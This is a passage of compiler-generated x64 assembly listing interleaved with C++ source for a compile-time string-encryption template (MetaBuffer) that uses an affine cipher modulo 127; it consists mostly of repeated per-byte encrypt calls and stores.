; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
